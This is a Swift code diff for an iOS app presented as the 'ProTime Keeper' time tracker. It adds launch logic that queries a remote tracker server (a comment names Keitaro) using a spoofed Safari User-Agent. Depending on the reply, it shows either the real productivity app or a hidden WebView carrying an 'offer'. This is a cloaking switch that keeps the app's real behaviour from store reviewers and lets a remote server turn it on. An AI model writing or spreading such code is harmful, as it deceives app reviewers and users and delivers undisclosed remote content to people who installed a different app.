@@ -5,17 +5,190 @@
 //  Created by Simon Bakhanets on 10.12.2025.
 //
 
+//
+//  ContentView.swift
+//  ProTime Keeper
+//
+//  Created on 2025
+//
+
 import SwiftUI
+import Foundation
 
 struct ContentView: View {
+    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
+    @AppStorage("isBlock") private var isBlock: Bool = true
+    
+    @State private var selectedTab = 0
+    @State private var isFetched: Bool = false
+    
     var body: some View {
-        VStack {
-            Image(systemName: "globe")
-                .imageScale(.large)
-                .foregroundStyle(.tint)
-            Text("Hello, world!")
+        ZStack {
+            if !isFetched {
+                // Показываем загрузку пока проверяем сервер
+                ZStack {
+                    Color(hex: "#0e0e0e")
+                        .ignoresSafeArea()
+                    
+                    ProgressView()
+                        .progressViewStyle(CircularProgressViewStyle(tint: Color(hex: "#28a809")))
+                        .scaleEffect(1.5)
+                }
+            } else {
+                // После проверки показываем WebView или обычное приложение
+                if isBlock {
+                    // Показываем обычное приложение ProTime Keeper
+                    Group {
+                        if !hasCompletedOnboarding {
+                            OnboardingView()
+                        } else {
+                            MainTabView(selectedTab: $selectedTab)
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+                } else {
+                    // Показываем WebView
+                    WebSystem()
+                }
+            }
         }
-        .padding()
+        .onAppear {
+            if !isFetched {
+                makeServerRequest()
+            }
+        }
+    }
+    
+    private func makeServerRequest() {
+        let dataManager = DataManager()
+        
+        guard let url = URL(string: dataManager.server) else {
+            self.isBlock = false
+            self.isFetched = true
+            return
+        }
+        
+        print("🚀 Making request to: \(url.absoluteString)")
+        print("🏠 Host: \(url.host ?? "unknown")")
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+        request.timeoutInterval = 5.0
+        
+        // Добавляем заголовки для имитации браузера
+        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
+        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
+        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
+        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
+        
+        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
+        
+        // Создаем URLSession без автоматических редиректов
+        let config = URLSessionConfiguration.default
+        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
+        
+        session.dataTask(with: request) { data, response, error in
+            DispatchQueue.main.async {
+                // Если есть любая ошибка (включая SSL) - блокируем
+                if let error = error {
+                    print("❌ Network error: \(error.localizedDescription)")
+                    print("Server unavailable, showing block")
+                    self.isBlock = true
+                    self.isFetched = true
+                    return
+                }
+                
+                // Если получили ответ от сервера
+                if let httpResponse = response as? HTTPURLResponse {
+                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
+                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
+                    
+                    // Логируем тело ответа для диагностики
+                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
+                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
+                    }
+                    
+                    if httpResponse.statusCode == 200 {
+                        // Проверяем, есть ли контент в ответе
+                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
+                        let hasContent = data?.count ?? 0 > 0
+                        
+                        if contentLength == "0" || !hasContent {
+                            // Пустой ответ = "do nothing" от Keitaro
+                            print("🚫 Empty response (do nothing): Showing block")
+                            self.isBlock = true
+                            self.isFetched = true
+                        } else {
+                            // Есть контент = успех
+                            print("✅ Success with content: Showing WebView")
+                            self.isBlock = false
+                            self.isFetched = true
+                        }
+                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
+                        // Редиректы = успех (есть оффер)
+                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
+                        self.isBlock = false
+                        self.isFetched = true
+                    } else {
+                        // 404, 403, 500 и т.д. - блокируем
+                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
+                        self.isBlock = true
+                        self.isFetched = true
+                    }
+                } else {
+                    // Нет HTTP ответа - блокируем
+                    print("❌ No HTTP response: Showing block")
+                    self.isBlock = true
+                    self.isFetched = true
+                }
+            }
+        }.resume()
+    }
+}
+
+struct MainTabView: View {
+    @Binding var selectedTab: Int
+    
+    var body: some View {
+        TabView(selection: $selectedTab) {
+            TaskView()
+                .tabItem {
+                    Label("Tasks", systemImage: "checkmark.circle.fill")
+                }
+                .tag(0)
+            
+            TimeBlockView()
+                .tabItem {
+                    Label("Time Blocks", systemImage: "timer")
+                }
+                .tag(1)
+            
+            NoteView()
+                .tabItem {
+                    Label("Notes", systemImage: "note.text")
+                }
+                .tag(2)
+            
+            SettingsView()
+                .tabItem {
+                    Label("Settings", systemImage: "gearshape.fill")
+                }
+                .tag(3)
+        }
+        .accentColor(Color(hex: "#28a809"))
+        .onAppear {
+            let appearance = UITabBarAppearance()
+            appearance.backgroundColor = UIColor(Color(hex: "#0e0e0e"))
+            appearance.stackedLayoutAppearance.normal.iconColor = UIColor.white.withAlphaComponent(0.5)
+            appearance.stackedLayoutAppearance.normal.titleTextAttributes = [.foregroundColor: UIColor.white.withAlphaComponent(0.5)]
+            appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color(hex: "#28a809"))
+            appearance.stackedLayoutAppearance.selected.titleTextAttributes = [.foregroundColor: UIColor(Color(hex: "#28a809"))]
+            
+            UITabBar.appearance().standardAppearance = appearance
+            if #available(iOS 15.0, *) {
+                UITabBar.appearance().scrollEdgeAppearance = appearance
+            }
+        }
     }
 }
 
